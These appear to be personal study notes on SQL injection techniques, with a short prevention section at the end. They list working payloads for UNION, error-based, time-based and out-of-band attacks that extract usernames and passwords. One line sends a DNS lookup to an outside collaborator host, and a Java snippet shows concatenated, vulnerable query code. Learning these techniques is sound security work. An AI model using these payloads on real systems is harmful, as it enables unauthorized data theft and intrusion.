
# SQL Injection (SQLI) Notes

## What is SQL Injection (SQLI)?
- A web security vulnerability that alters the main query sent from an application to the database.
- Allows attackers to access unauthorized data.
- Often occurs in the WHERE clause of SELECT queries.
- Can escalate to compromise the server, such as gaining administrator access.

## Basic SQLI
- Utilizes single quotes (`'`) to probe for anomalous responses.
- Boolean conditions employed: `OR 1=1`, `OR 1=2` (FALSE), `OR 'a' = 'b'` (making it TRUE).

## SQLI UNION Attacks
- Exploits applications vulnerable to SQLI to retrieve data from different tables using `UNION`.
- `UNION` combines the results of two or more SELECT queries.
- Requirements:
  - Both queries must return the same number of columns.
  - Data types must be compatible.
- Techniques for determining the number of columns:
  - Increment the `ORDER BY` clause until an error occurs (e.g., `ORDER BY 1--`, `ORDER BY 2--`).
  - Use `UNION SELECT` with varying numbers of NULLs.

## Oracle SQLI
- The `SELECT` query must include the `FROM` keyword.
- Utilizes the built-in table "dual" (e.g., `' UNION SELECT NULL FROM DUAL--`).
- Combines column values with a delimiter for queries returning single column values (e.g., `' UNION SELECT username || '~' || password FROM users--`).

## MySQL SQLI
- Comments require a space after `--`.
- The `#` character can also denote a comment.
- Identifying columns with useful data types:
  - Use `UNION SELECT` payloads to test for string-type columns.

## Blind SQLI
- Occurs when the application is vulnerable to SQLI but the HTTP response does not contain the query result.
- Allows attackers to infer information based on differing server responses.
- Ineffective with UNION attacks.

## Error-Based SQLI
- Utilizes errors to extract or infer sensitive data.
- Effectiveness varies with Boolean conditions.
- Examples:
  - `' AND (SELECT CASE WHEN (Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') THEN 1/0 ELSE 'a' END FROM Users)='a`
  - `'||(SELECT CASE WHEN SUBSTR(password,1,1)='a' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'`
- Can extract data through verbose SQL errors.
- Uses the `CAST()` function to convert data types and bypass conditional response prevention.
- Working examples that return data through error messages:
  - `' AND 1=CAST((SELECT username FROM users LIMIT 1)AS INT)—`
  - `' AND 1=CAST((SELECT password FROM users LIMIT 1)AS INT)—`

## Time-based SQLI
- Tests server response time to infer SQLI presence, especially useful if the database handles query errors robustly.
- Database-specific queries.
- Examples:
  - `'; IF (1=2) WAITFOR DELAY '0:0:10'—` (no time delay, true condition)
  - `'; IF (1=1) WAITFOR DELAY '0:0:10'--` (time delay, false condition)
- Working example:
  - `';SELECT+CASE+WHEN+(username='administrator' AND SUBSTRING(password,20,1)='§a§')+THEN+pg_sleep(5)+ELSE+pg_sleep(0)+END FROM users—`

## OAST SQLI (Out-of-band Application Security Testing)
- A form of Blind SQLI that makes the server interact with a system under the attacker's control, often via DNS.
- Uses tools like Burp Collaborator for network interaction detection.
- Examples:
  - `'; exec master..xp_dirtree '//0efdymgw1o5w9inae8mg4dfrgim9ay.burpcollaborator.net/a'—` (DNS lookup on a specific domain)
  - Using UNION and XXE for DNS lookups on collaborator subdomains.
  - SQLI in OAST to leak data, with the leaked data being part of the subdomain name.

## Bypassing SQLI Filters
- Using the hackvector extension in Burp Suite to encode payloads for XML WAP bypass.
- Example: `<@dec_entities>1 UNION SELECT username || '~' || password FROM users;<@/dec_entities>`

## Checking Database Version
- MySQL: `SELECT @@version`
- Oracle: `SELECT * FROM v$version`
- PostgreSQL: `SELECT version()`

## SQLI Prevention:
- Illustrates how code is vulnerable to SQLI and how to prevent it by parameterizing the query.
- Highlights the importance of not allowing user input to interfere with the SQL query structure.
- Emphasizes best practices like input whitelisting, logical separation, and constant hard-coding.
- The following code is vulnerable to SQLI due to direct execution of user input by having it directly concatenated into the query
  - String query = "SELECT * FROM products WHERE category = '"+ input + "'";
  - Statement statement = connection.createStatement();
  - ResultSet resultSet = statement.executeQuery(query);


